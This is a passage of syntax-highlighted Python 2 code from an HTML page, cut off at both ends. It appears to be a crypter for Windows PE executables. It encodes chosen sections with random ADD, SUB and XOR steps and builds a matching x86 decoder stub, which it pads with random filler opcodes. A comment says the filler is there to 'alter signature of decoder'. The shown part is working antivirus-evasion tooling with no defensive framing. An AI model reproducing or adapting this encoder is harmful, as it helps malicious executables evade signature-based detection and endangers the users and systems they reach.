style="color:#0088ff;font-weight:400">#&nbsp;benign&nbsp;filler&nbsp;instructions&nbsp;to&nbsp;include&nbsp;in&nbsp;the&nbsp;decoder</span><br />	filler_instructions&nbsp;=&nbsp;[<br />							<span style="color:#3ad900;font-weight:400">"\x90"</span>,&nbsp;			<span style="color:#0088ff;font-weight:400">#&nbsp;NOP</span><br />							<span style="color:#3ad900;font-weight:400">"\x60\x61"</span>,		&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;PUSHAD|POPAD</span><br />							<span style="color:#3ad900;font-weight:400">"\x9c\x9d"</span>,&nbsp;		<span style="color:#0088ff;font-weight:400">#&nbsp;PUSHFD|POPFD</span><br />							<span style="color:#3ad900;font-weight:400">"\x40\x48"</span>,		&nbsp;	<span style="color:#0088ff;font-weight:400">#&nbsp;INC&nbsp;EAX|DEC&nbsp;EAX</span><br />							<span style="color:#3ad900;font-weight:400">"\x41\x49"</span>,&nbsp;		<span style="color:#0088ff;font-weight:400">#&nbsp;INC&nbsp;ECX|DEC&nbsp;ECX</span><br />							<span style="color:#3ad900;font-weight:400">"\x42\x4A"</span>,&nbsp;		<span style="color:#0088ff;font-weight:400">#&nbsp;INC&nbsp;EDX|DEC&nbsp;EDX</span><br />							<span style="color:#3ad900;font-weight:400">"\x43\x4B"</span>,&nbsp;		<span style="color:#0088ff;font-weight:400">#&nbsp;INC&nbsp;EBX|DEC&nbsp;EBX</span><br />							<span style="color:#3ad900;font-weight:400">"\x51\x31\xc9\x59"</span>,	<span style="color:#0088ff;font-weight:400">#&nbsp;PUSH&nbsp;ECX|XOR&nbsp;ECX,ECX|POP&nbsp;ECX</span><br />							<span style="color:#3ad900;font-weight:400">"\x52\x31\xd2\x5a"</span>,	<span style="color:#0088ff;font-weight:400">#&nbsp;PUSH&nbsp;EDX|XOR&nbsp;EDX,EDX|POP&nbsp;EDX</span><br />							<span style="color:#3ad900;font-weight:400">"\x53\x31\xdb\x5b"</span>	<span style="color:#0088ff;font-weight:400">#&nbsp;PUSH&nbsp;EBX|XOR&nbsp;EBX,EBX|POP&nbsp;EBX</span><br />						&nbsp;&nbsp;]<br />	<br />	<span style="color:#0088ff;font-weight:400">#&nbsp;add&nbsp;benign&nbsp;filler&nbsp;instructions&nbsp;to&nbsp;the&nbsp;decoder</span><br />	num_fill_instructions&nbsp;=&nbsp;randint(<span style="color:#ff0044;font-weight:400">1</span>,limit)<br />	fill_instruction&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />	<span style="color:#ff9d00;font-weight:700">while</span>&nbsp;(num_fill_instructions&nbsp;&gt;&nbsp;<span style="color:#ff0044;font-weight:400">0</span>):<br />		fill_instruction&nbsp;+=&nbsp;filler_instructions[randint(<span style="color:#ff0044;font-weight:400">0</span>,<span style="color:#ff9d00;font-weight:700">len</span>(filler_instructions)-<span style="color:#ff0044;font-weight:400">1</span>)]<br />		num_fill_instructions&nbsp;-=&nbsp;<span style="color:#ff0044;font-weight:400">1</span><br />	<br />	<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;fill_instruction<br /><br /><span style="color:#3ad900;font-weight:400">'''&nbsp;<br />	Generate&nbsp;the&nbsp;encoder&nbsp;instructions&nbsp;using&nbsp;pseudo-random&nbsp;selection&nbsp;for<br />	number,&nbsp;order,&nbsp;and&nbsp;modifiers<br />'''</span>		<br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;build_encoder(heuristic_iterations):<br /><br />	encoder&nbsp;=&nbsp;[]<br />	encode_instructions&nbsp;=&nbsp;[<span style="color:#3ad900;font-weight:400">"ADD"</span>,<span style="color:#3ad900;font-weight:400">"SUB"</span>,<span style="color:#3ad900;font-weight:400">"XOR"</span>]&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;possible&nbsp;encode&nbsp;operations</span><br />	num_encode_instructions&nbsp;=&nbsp;randint(<span style="color:#ff0044;font-weight:400">5</span>,<span style="color:#ff0044;font-weight:400">10</span>)&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;determine&nbsp;the&nbsp;number&nbsp;of&nbsp;encode&nbsp;instructions</span><br /><br />	<span style="color:#0088ff;font-weight:400">#&nbsp;build&nbsp;the&nbsp;dynamic&nbsp;portion&nbsp;of&nbsp;the&nbsp;encoder</span><br />	<span style="color:#ff9d00;font-weight:700">while</span>&nbsp;(num_encode_instructions&nbsp;&gt;&nbsp;<span style="color:#ff0044;font-weight:400">0</span>):<br />		modifier&nbsp;=&nbsp;randint(<span style="color:#ff0044;font-weight:400">0</span>,<span style="color:#ff0044;font-weight:400">255</span>)<br />		<br />		<span style="color:#0088ff;font-weight:400">#&nbsp;determine&nbsp;the&nbsp;encode&nbsp;instruction</span><br />		encode_instruction&nbsp;=&nbsp;random.choice(encode_instructions)<br />		encoder.append(encode_instruction&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;"</span>&nbsp;+&nbsp;<span style="color:#ff9d00;font-weight:700">str</span>(modifier))&nbsp;<br />		<br />		num_encode_instructions&nbsp;-=&nbsp;<span style="color:#ff0044;font-weight:400">1</span><br />	<br />	<span style="color:#0088ff;font-weight:400">#&nbsp;build&nbsp;the&nbsp;last&nbsp;xor&nbsp;instruction&nbsp;using&nbsp;a&nbsp;pseudo-random&nbsp;modifier&nbsp;plus&nbsp;the&nbsp;number&nbsp;of&nbsp;heuristic&nbsp;iterations</span><br />	<span style="color:#0088ff;font-weight:400">#&nbsp;TODO:&nbsp;use&nbsp;the&nbsp;heuristic&nbsp;iterations&nbsp;modifier&nbsp;as&nbsp;additional&nbsp;decode&nbsp;step&nbsp;at&nbsp;run&nbsp;time</span><br />	modifier&nbsp;=&nbsp;randint(<span style="color:#ff0044;font-weight:400">1</span>,<span style="color:#ff0044;font-weight:400">100</span>)<br />	encoder.append(<span style="color:#3ad900;font-weight:400">"XOR&nbsp;"</span>&nbsp;+&nbsp;<span style="color:#ff9d00;font-weight:700">str</span>(modifier&nbsp;+&nbsp;heuristic_iterations))<br />	<br />	<span style="color:#0088ff;font-weight:400">#&nbsp;print&nbsp;the&nbsp;encoder</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[*]&nbsp;Generated&nbsp;Encoder&nbsp;with&nbsp;the&nbsp;following&nbsp;instructions:"</span><br />	<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;item&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;encoder:<br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"\t[+]&nbsp;%s&nbsp;%s"</span>&nbsp;%&nbsp;(item.split(<span style="color:#3ad900;font-weight:400">"&nbsp;"</span>)[<span style="color:#ff0044;font-weight:400">0</span>],&nbsp;<span style="color:#ff9d00;font-weight:700">hex</span>(<span style="color:#ff9d00;font-weight:700">int</span>(item.split(<span style="color:#3ad900;font-weight:400">"&nbsp;"</span>)[<span style="color:#ff0044;font-weight:400">1</span>])))<br />		<br />	<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;encoder<br /><br /><span style="color:#3ad900;font-weight:400">'''&nbsp;<br />	Generate&nbsp;the&nbsp;decoder&nbsp;instructions&nbsp;corresponding&nbsp;to&nbsp;the&nbsp;<br />	provided&nbsp;encoder&nbsp;<br />'''</span>	<br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;build_decoder(pe,&nbsp;encoder,&nbsp;section,&nbsp;decode_start,&nbsp;decode_end):<br />	<br />	<span style="color:#3ad900;font-weight:400">'''<br />		Our&nbsp;decoder&nbsp;should&nbsp;look&nbsp;as&nbsp;follows:<br />		<br />		get_address:<br />			mov&nbsp;eax,&nbsp;decode_start_address&nbsp;		;&nbsp;Move&nbsp;address&nbsp;of&nbsp;sections's&nbsp;first&nbsp;encoded&nbsp;byte&nbsp;into&nbsp;EAX<br />		decode:&nbsp;								;&nbsp;assume&nbsp;decode&nbsp;of&nbsp;at&nbsp;least&nbsp;one&nbsp;byte&nbsp;<br />			...dynamic&nbsp;decode&nbsp;instructions...	;&nbsp;decode&nbsp;operations&nbsp;+&nbsp;benign&nbsp;fill<br />			inc&nbsp;eax								;&nbsp;increment&nbsp;decode&nbsp;address<br />			cmp&nbsp;eax,&nbsp;encode_end_address			;&nbsp;check&nbsp;address&nbsp;with&nbsp;end_address	<br />			jle,&nbsp;decode							;&nbsp;if&nbsp;in&nbsp;range,&nbsp;loop&nbsp;back&nbsp;to&nbsp;start&nbsp;of&nbsp;decode&nbsp;function<br />			...benign&nbsp;filler&nbsp;instructions...	;&nbsp;additional&nbsp;benign&nbsp;instructions&nbsp;that&nbsp;alter&nbsp;signature&nbsp;of&nbsp;decoder	<br />	'''</span><br />	decode_instructions&nbsp;=&nbsp;{<br />								<span style="color:#3ad900;font-weight:400">"ADD"</span>:<span style="color:#3ad900;font-weight:400">"\x80\x28"</span>,&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;add&nbsp;encode&nbsp;w/&nbsp;corresponding&nbsp;decoder&nbsp;==&gt;&nbsp;SUB&nbsp;BYTE&nbsp;PTR&nbsp;DS:[EAX]&nbsp;</span><br />								<span style="color:#3ad900;font-weight:400">"SUB"</span>:<span style="color:#3ad900;font-weight:400">"\x80\x00"</span>,	<span style="color:#0088ff;font-weight:400">#&nbsp;sub&nbsp;encode&nbsp;w/&nbsp;corresponding&nbsp;add&nbsp;decoder&nbsp;==&gt;&nbsp;ADD&nbsp;BYTE&nbsp;PTR&nbsp;DS:[EAX]</span><br />								<span style="color:#3ad900;font-weight:400">"XOR"</span>:<span style="color:#3ad900;font-weight:400">"\x80\x30"</span>&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;xor&nbsp;encode&nbsp;w/&nbsp;corresponding&nbsp;xor&nbsp;decoder&nbsp;==&gt;&nbsp;XOR&nbsp;BYTE&nbsp;PTR&nbsp;DS:[EAX]</span><br />						&nbsp;&nbsp;&nbsp;}<br /><br />	decoder&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />	<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;i&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;encoder:<br />		encode_instruction&nbsp;=&nbsp;i.split(<span style="color:#3ad900;font-weight:400">"&nbsp;"</span>)[<span style="color:#ff0044;font-weight:400">0</span>]&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;get&nbsp;encoder&nbsp;operation</span><br />		modifier&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>(i.split(<span style="color:#3ad900;font-weight:400">"&nbsp;"</span>)[<span style="color:#ff0044;font-weight:400">1</span>])		&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;get&nbsp;operation&nbsp;modifier</span><br />		decode_instruction&nbsp;=&nbsp;(decode_instructions[encode_instruction]&nbsp;+&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">"B"</span>,&nbsp;modifier))&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;get&nbsp;corresponding&nbsp;decoder&nbsp;instruction</span><br />		decoder&nbsp;=&nbsp;decode_instruction&nbsp;+&nbsp;decoder&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;prepend&nbsp;the&nbsp;decode&nbsp;instruction&nbsp;to&nbsp;execute&nbsp;in&nbsp;reverse&nbsp;order</span><br />		<br />		<span style="color:#0088ff;font-weight:400">#&nbsp;add&nbsp;some&nbsp;fill&nbsp;instructions</span><br />		fill_instruction&nbsp;=&nbsp;add_fill_instructions(<span style="color:#ff0044;font-weight:400">2</span>)<br />		decoder&nbsp;=&nbsp;fill_instruction&nbsp;+&nbsp;decoder<br />	<br />	mov_instruct&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"\xb8"</span>&nbsp;+&nbsp;decode_start&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;mov&nbsp;eax,&nbsp;decode_start</span><br />	decoder&nbsp;=&nbsp;mov_instruct&nbsp;+&nbsp;decoder&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;prepend&nbsp;the&nbsp;decoder&nbsp;with&nbsp;the&nbsp;mov&nbsp;instruction&nbsp;</span><br />	decoder&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"\x40"</span>&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;inc&nbsp;eax</span><br />	decoder&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"\x3d"</span>&nbsp;+&nbsp;decode_end&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;cmp&nbsp;eax,&nbsp;decode_end</span><br />	back_jump_value&nbsp;=&nbsp;binascii.unhexlify(format((<span style="color:#ff0044;font-weight:400">1</span>&nbsp;&lt;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">16</span>)&nbsp;-&nbsp;(<span style="color:#ff9d00;font-weight:700">len</span>(decoder)-<span style="color:#ff9d00;font-weight:700">len</span>(mov_instruct)+<span style="color:#ff0044;font-weight:400">2</span>),&nbsp;<span style="color:#3ad900;font-weight:400">'x'</span>)[<span style="color:#ff0044;font-weight:400">2</span>:])&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;TODO:&nbsp;keep&nbsp;the&nbsp;total&nbsp;length&nbsp;&lt;&nbsp;128&nbsp;for&nbsp;this&nbsp;short&nbsp;jump</span><br />	decoder&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"\x7e"</span>&nbsp;+&nbsp;back_jump_value&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;jle,&nbsp;start_of_decode&nbsp;</span><br />	decoder&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"\x90\x90"</span>&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;NOPS</span><br />					&nbsp;<br />	<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;decoder<br />	<br /><span style="color:#3ad900;font-weight:400">'''<br />	Execute&nbsp;various&nbsp;encoding&nbsp;operations&nbsp;for&nbsp;given&nbsp;input<br />'''</span><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;do_encode(byte_in,&nbsp;encoder):	<br /><br />	<span style="color:#0088ff;font-weight:400">#&nbsp;encoder&nbsp;is&nbsp;built&nbsp;using&nbsp;the&nbsp;build_encoder()&nbsp;function&nbsp;&nbsp;</span><br />	<span style="color:#0088ff;font-weight:400">#&nbsp;each&nbsp;entry&nbsp;has&nbsp;the&nbsp;following&nbsp;format:&nbsp;instruction&nbsp;modifier</span><br />	enc&nbsp;=&nbsp;byte_in<br />	<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;entry&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;encoder:<br />		instruction&nbsp;=&nbsp;entry.strip().split(<span style="color:#3ad900;font-weight:400">"&nbsp;"</span>)[<span style="color:#ff0044;font-weight:400">0</span>]<br />		modifier&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>(entry.strip().split(<span style="color:#3ad900;font-weight:400">"&nbsp;"</span>)[<span style="color:#ff0044;font-weight:400">1</span>])	&nbsp;<br /><br />		<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;instruction&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"ADD"</span>:<br />			enc&nbsp;=&nbsp;do_add(enc,&nbsp;modifier)	<br />		<span style="color:#ff9d00;font-weight:700">elif</span>&nbsp;instruction&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"SUB"</span>:<br />			enc&nbsp;=&nbsp;do_sub(enc,&nbsp;modifier)<br />		<span style="color:#ff9d00;font-weight:700">else</span>:		<br />			enc&nbsp;=&nbsp;do_xor(enc,&nbsp;modifier)<br />	<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;enc<br />	<br /><span style="color:#3ad900;font-weight:400">'''<br />	Retrieve&nbsp;desired&nbsp;bytes&nbsp;from&nbsp;pe&nbsp;file<br />'''</span>		<br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;retrieve_data(pe,&nbsp;section_name,&nbsp;<span style="color:#ff9d00;font-weight:700">type</span>):<br />	<span style="color:#ff9d00;font-weight:700">try</span>:<br />		section_header&nbsp;=&nbsp;get_section_header(pe,&nbsp;section_name)<br />		section_start=section_header.VirtualAddress<br />	<span style="color:#ff9d00;font-weight:700">except</span>:<br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[!]&nbsp;ERROR:&nbsp;Could&nbsp;not&nbsp;retrieve&nbsp;section&nbsp;data.&nbsp;Check&nbsp;the&nbsp;section&nbsp;name."</span><br />		sys.exit(<span style="color:#ff0044;font-weight:400">2</span>)<br />		<br />	<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">type</span>&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"raw"</span>:<br />		<span style="color:#0088ff;font-weight:400">#&nbsp;grab&nbsp;entire&nbsp;section&nbsp;including&nbsp;ending&nbsp;nulls</span><br />		section_stop=section_start+section_header.SizeOfRawData<br />	<span style="color:#ff9d00;font-weight:700">else</span>:<br />		<span style="color:#0088ff;font-weight:400">#&nbsp;just&nbsp;grab&nbsp;up&nbsp;to&nbsp;the&nbsp;virtual&nbsp;size</span><br />		section_stop=section_start+section_header.Misc_VirtualSize<br />	data&nbsp;=&nbsp;binascii.hexlify(pe.get_memory_mapped_image()[section_start:section_stop])&nbsp;<br />	data&nbsp;=&nbsp;re.findall(<span style="color:#3ad900;font-weight:400">r'.{1,2}'</span>,data,re.DOTALL)<br />	<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;data<br />	<br /><span style="color:#3ad900;font-weight:400">'''<br />	Encode&nbsp;the&nbsp;named&nbsp;section(s)&nbsp;using&nbsp;multiple&nbsp;iterations&nbsp;of&nbsp;sub,add,xor<br />'''</span><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;encode_data(pe,&nbsp;section_to_encode,&nbsp;encoder):<br />	<br />	decoder&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />						<br />	<span style="color:#0088ff;font-weight:400">#&nbsp;get&nbsp;the&nbsp;name&nbsp;of&nbsp;the&nbsp;section(s)&nbsp;to&nbsp;encode</span><br />	<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;section_to_encode:	<br />		<span style="color:#ff9d00;font-weight:700">try</span>:<br />			sections&nbsp;=&nbsp;section_to_encode.split(<span style="color:#3ad900;font-weight:400">","</span>)&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;multiple&nbsp;sections&nbsp;provided</span><br />		<span style="color:#ff9d00;font-weight:700">except</span>:<br />			sections&nbsp;=&nbsp;[section_to_encode]&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;only&nbsp;a&nbsp;single&nbsp;section&nbsp;provided</span><br />		sections&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">list</span>(<span style="color:#ff9d00;font-weight:700">set</span>(sections))&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;dedupe&nbsp;list&nbsp;of&nbsp;sections</span><br />							<br />		<span style="color:#0088ff;font-weight:400">#&nbsp;for&nbsp;each&nbsp;section&nbsp;value&nbsp;provided,&nbsp;grab&nbsp;the&nbsp;</span><br />		<span style="color:#0088ff;font-weight:400">#&nbsp;name&nbsp;and&nbsp;the&nbsp;range&nbsp;to&nbsp;encode</span><br />		<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(sections)&nbsp;&gt;&nbsp;<span style="color:#ff0044;font-weight:400">0</span>:<br />			<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;section&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;sections:	<br />				section&nbsp;=&nbsp;section.strip()<br />				<br />				<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;section:<br />					<span style="color:#ff9d00;font-weight:700">try</span>:<br />						<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(section.split(<span style="color:#3ad900;font-weight:400">":"</span>))&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">3</span>:<br />							<span style="color:#0088ff;font-weight:400">#&nbsp;name,&nbsp;offset,&nbsp;and&nbsp;encode_length</span><br />							section_name&nbsp;=&nbsp;section.split(<span style="color:#3ad900;font-weight:400">":"</span>)[<span style="color:#ff0044;font-weight:400">0</span>]<br />							encode_offset&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>(section.split(<span style="color:#3ad900;font-weight:400">":"</span>)[<span style="color:#ff0044;font-weight:400">1</span>])<br />							encode_length&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>(section.split(<span style="color:#3ad900;font-weight:400">":"</span>)[<span style="color:#ff0044;font-weight:400">2</span>])<br />						<span style="color:#ff9d00;font-weight:700">elif</span>&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(section.split(<span style="color:#3ad900;font-weight:400">":"</span>))&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">2</span>:<br />							<span style="color:#0088ff;font-weight:400">#&nbsp;name&nbsp;and&nbsp;offset&nbsp;provided</span><br />							section_name&nbsp;=&nbsp;section.split(<span style="color:#3ad900;font-weight:400">":"</span>)[<span style="color:#ff0044;font-weight:400">0</span>]<br />							encode_offset&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>(section.split(<span style="color:#3ad900;font-weight:400">":"</span>)[<span style="color:#ff0044;font-weight:400">1</span>])<br />							encode_length&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span><br />						<span style="color:#ff9d00;font-weight:700">elif</span>&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(section.split(<span style="color:#3ad900;font-weight:400">":"</span>))&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">1</span>:<br />							<span style="color:#0088ff;font-weight:400">#&nbsp;only&nbsp;name&nbsp;provided</span><br />							section_name&nbsp;=&nbsp;section.split(<span style="color:#3ad900;font-weight:400">":"</span>)[<span style="color:#ff0044;font-weight:400">0</span>]<br />							encode_offset&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span><br />							encode_length&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span><br />						<span style="color:#ff9d00;font-weight:700">else</span>:<br />							<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Invalid&nbsp;parameter&nbsp;provided.&nbsp;Use&nbsp;-h&nbsp;or&nbsp;--help&nbsp;for&nbsp;more&nbsp;info"</span><br />							sys.exit(<span style="color:#ff0044;font-weight:400">2</span>)<br />					<span style="color:#ff9d00;font-weight:700">except</span>:<br />						<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[!]&nbsp;ERROR:&nbsp;Could&nbsp;not&nbsp;parse&nbsp;section&nbsp;name.&nbsp;Check&nbsp;the&nbsp;value&nbsp;provided&nbsp;for&nbsp;the&nbsp;-e&nbsp;option"</span><br />						sys.exit(<span style="color:#ff0044;font-weight:400">2</span>)<br />						<br />					<span style="color:#0088ff;font-weight:400">#&nbsp;grab&nbsp;the&nbsp;section&nbsp;header</span><br />					<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;section_name&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"default"</span>:<br />						<span style="color:#0088ff;font-weight:400">#&nbsp;no&nbsp;specified&nbsp;section&nbsp;name,&nbsp;use&nbsp;section&nbsp;associated&nbsp;with&nbsp;entry&nbsp;point</span><br />						<span style="color:#0088ff;font-weight:400">#&nbsp;this&nbsp;will&nbsp;typically&nbsp;default&nbsp;to&nbsp;the&nbsp;.text&nbsp;or&nbsp;.code&nbsp;section&nbsp;&nbsp;</span><br />						section_header&nbsp;=&nbsp;pe.get_section_by_rva(pe.OPTIONAL_HEADER.AddressOfEntryPoint)<br />						section_name&nbsp;=&nbsp;section_header.Name<br />					<span style="color:#ff9d00;font-weight:700">elif</span>&nbsp;section_name&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">""</span>:<br />						<span style="color:#0088ff;font-weight:400">#&nbsp;skip&nbsp;a&nbsp;blank&nbsp;section&nbsp;name</span><br />						<span style="color:#ff9d00;font-weight:700">continue</span><br />					<span style="color:#ff9d00;font-weight:700">else</span>:&nbsp;<br />						section_header&nbsp;=&nbsp;get_section_header(pe,&nbsp;section_name)<br />						<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">not</span>&nbsp;section_header:<br />							<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"\n[!]&nbsp;ERROR:&nbsp;Invalid&nbsp;section&nbsp;name&nbsp;provided:&nbsp;%s.&nbsp;Exiting"</span>&nbsp;%&nbsp;section_name<br />							sys.exit(<span style="color:#ff0044;font-weight:400">2</span>)<br />					<br /><br />					<span style="color:#0088ff;font-weight:400">#&nbsp;build&nbsp;the&nbsp;decoder&nbsp;for&nbsp;each&nbsp;section</span><br />					image_base&nbsp;=&nbsp;pe.OPTIONAL_HEADER.ImageBase<br />					section_start&nbsp;=&nbsp;image_base&nbsp;+&nbsp;section_header.VirtualAddress<br />					decode_start&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">"L"</span>,&nbsp;section_start&nbsp;+&nbsp;encode_offset)<br />					<br />					<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;encode_length&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">0</span>:<br />						<span style="color:#0088ff;font-weight:400">#&nbsp;encode&nbsp;/&nbsp;decode&nbsp;until&nbsp;the&nbsp;end&nbsp;of&nbsp;the&nbsp;section</span><br />						decode_end&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">"L"</span>,&nbsp;section_start&nbsp;+&nbsp;section_header.Misc_VirtualSize)<br />					<span style="color:#ff9d00;font-weight:700">else</span>:<br />						<span style="color:#0088ff;font-weight:400">#&nbsp;stop&nbsp;encoding&nbsp;/&nbsp;decoding&nbsp;at&nbsp;desired&nbsp;location&nbsp;represented&nbsp;by&nbsp;offset&nbsp;+&nbsp;length</span><br />						decode_end&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">"L"</span>,&nbsp;section_start&nbsp;+&nbsp;encode_offset&nbsp;+&nbsp;encode_length)<br />					<br />					decoder&nbsp;+=&nbsp;build_decoder(pe,&nbsp;encoder,&nbsp;section_header,&nbsp;decode_start,&nbsp;decode_end)&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;now&nbsp;build&nbsp;the&nbsp;corresponding&nbsp;decoder</span><br />					encoded_data&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span>&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;will&nbsp;hold&nbsp;encoded&nbsp;data</span><br />					data_to_encode&nbsp;=&nbsp;retrieve_data(pe,&nbsp;section_name,&nbsp;<span style="color:#3ad900;font-weight:400">"virtual"</span>)&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;grab&nbsp;unencoded&nbsp;data&nbsp;from&nbsp;section</span><br />					<br />					<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;encode_length&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">0</span>:<br />						encode_length&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(data_to_encode)&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;encode&nbsp;entire&nbsp;section&nbsp;from&nbsp;offset</span><br />					<br />					<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;encode_offset&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">0</span>&nbsp;<span style="color:#ff9d00;font-weight:700">and</span>&nbsp;encode_length&nbsp;==&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(data_to_encode):<br />						<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[*]&nbsp;Encoding&nbsp;entire&nbsp;%s&nbsp;section"</span>&nbsp;%&nbsp;section_name<br />					<span style="color:#ff9d00;font-weight:700">else</span>:<br />						<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[*]&nbsp;Encoding&nbsp;a&nbsp;total&nbsp;of&nbsp;%i&nbsp;bytes&nbsp;data&nbsp;of&nbsp;the&nbsp;%s&nbsp;section&nbsp;starting&nbsp;at&nbsp;offset&nbsp;%i"</span>&nbsp;%&nbsp;(encode_length,&nbsp;section_name,&nbsp;encode_offset)&nbsp;	<br />					<br />					section_size&nbsp;=&nbsp;section_header.Misc_VirtualSize<br />					<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;encode_offset&nbsp;&gt;&nbsp;section_size:<br />						<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[!]&nbsp;Provided&nbsp;offset&nbsp;for&nbsp;%s&nbsp;larger&nbsp;than&nbsp;section&nbsp;size.&nbsp;Skipping&nbsp;encoding."</span>&nbsp;%&nbsp;section_name<br />						<span style="color:#ff9d00;font-weight:700">continue</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />					<span style="color:#0088ff;font-weight:400">#&nbsp;generate&nbsp;encoded&nbsp;bytes</span><br />					count&nbsp;=&nbsp;<span 